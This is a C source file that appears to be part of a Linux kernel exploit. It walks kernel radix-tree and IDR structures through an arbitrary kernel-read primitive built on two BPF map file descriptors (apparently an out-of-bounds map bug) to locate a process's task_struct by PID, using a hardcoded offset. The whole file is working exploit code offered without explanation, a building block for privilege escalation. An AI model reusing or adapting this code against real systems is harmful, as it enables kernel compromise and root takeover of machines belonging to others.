#include "task_struct_search.h"
#include <sys/types.h>
#include <stdio.h>

static int oob_map_fd;
static int store_map_fd;

#define RADIX_TREE_ENTRY_MASK		3UL
#define RADIX_TREE_INTERNAL_NODE	2UL

static inline int radix_tree_is_internal_node(void *ptr)
{
	return ((unsigned long)ptr & RADIX_TREE_ENTRY_MASK) ==
				RADIX_TREE_INTERNAL_NODE;
}

static inline struct radix_tree_node *entry_to_node(void *ptr)
{
	return (void *)((unsigned long)ptr & ~RADIX_TREE_INTERNAL_NODE);
}

/*#define rcu_dereference_raw(p) ({ typeof(p) ________p1 = READ_ONCE(p); ((typeof(*p) __force __kernel *)(________p1)); }) */

static unsigned int radix_tree_descend(const struct radix_tree_node *parent,
			struct radix_tree_node **nodep, unsigned long index)
{
    uint32_t shift_buf;
    read_kernel(oob_map_fd, store_map_fd, &parent->shift, 4, &shift_buf);
    uint8_t shift = ((uint8_t*)&shift_buf)[0];
	unsigned int offset = (index >> shift) & RADIX_TREE_MAP_MASK;
	/* void __rcu **entry = rcu_dereference_raw(parent->slots[offset]); */
    uint64_t val;
    read_kernel(oob_map_fd, store_map_fd, &parent->slots[offset], 8, &val);
    void __rcu **entry = val;

	*nodep = (void *)entry;
	return offset;
}

static inline unsigned long shift_maxindex(unsigned int shift)
{
	return (RADIX_TREE_MAP_SIZE << shift) - 1;
}

static inline unsigned long node_maxindex(const struct radix_tree_node *node)
{
    uint32_t shift;
    read_kernel(oob_map_fd, store_map_fd, &node->shift, 4, &shift);
	return shift_maxindex(shift);
}

static unsigned radix_tree_load_root(const struct radix_tree_root *root,
		struct radix_tree_node **nodep, unsigned long *maxindex)
{
    /* struct radix_tree_node *node = rcu_dereference_raw(root->xa_head); */
    uint64_t val;
    read_kernel(oob_map_fd, store_map_fd, &root->xa_head, 8, &val);
	struct radix_tree_node *node = val;

	*nodep = node;

	if (radix_tree_is_internal_node(node)) {
		node = entry_to_node(node);
		*maxindex = node_maxindex(node);
        uint32_t shift;
        read_kernel(oob_map_fd, store_map_fd, &node->shift, 4, &shift);
		return shift + RADIX_TREE_MAP_SHIFT;
	}

	*maxindex = 0;
	return 0;
}


static void *__radix_tree_lookup(const struct radix_tree_root *root,
			  unsigned long index)
{
	struct radix_tree_node *node, *parent;
	unsigned long maxindex;

 restart:
	parent = NULL;
	radix_tree_load_root(root, &node, &maxindex);
	if (index > maxindex)
		return NULL;

	while (radix_tree_is_internal_node(node)) {
		unsigned offset;

		parent = entry_to_node(node);
		offset = radix_tree_descend(parent, &node, index);
		if (node == RADIX_TREE_RETRY)
			goto restart;
        uint32_t shift_buf;
        read_kernel(oob_map_fd, store_map_fd, &parent->shift, 4, &shift_buf);
        uint8_t shift = ((uint8_t*)&shift_buf)[0]; 
		if (shift == 0)
			break;
	}

	return node;
}

static void *idr_find(const struct idr *idr, unsigned long id)
{
    /* return radix_tree_lookup(&idr->idr_rt, id - idr->idr_base); */
    uint32_t idr_base;
    read_kernel(oob_map_fd, store_map_fd, (uint64_t) &idr->idr_base, 4, &idr_base);
	return __radix_tree_lookup(&idr->idr_rt, id - (unsigned long)idr_base);
}

static void *find_pid_ns(int nr, struct pid_namespace *ns)
{
	return idr_find(&ns->idr, nr);
}

#define OFFSET_FIRST_TO_TASK_STRUCT 0x988

uint64_t find_task_struct_by_pid_ns(int _oob_map_fd, int _store_map_fd, pid_t nr, struct pid_namespace *ns)
{
    oob_map_fd = _oob_map_fd;
    store_map_fd = _store_map_fd;
    uint64_t pid_struct_addr = (uint64_t)find_pid_ns(nr, ns);
    uint64_t first;
    read_kernel(oob_map_fd, store_map_fd, pid_struct_addr + 0x10, 8, &first);
    return first - OFFSET_FIRST_TO_TASK_STRUCT;
}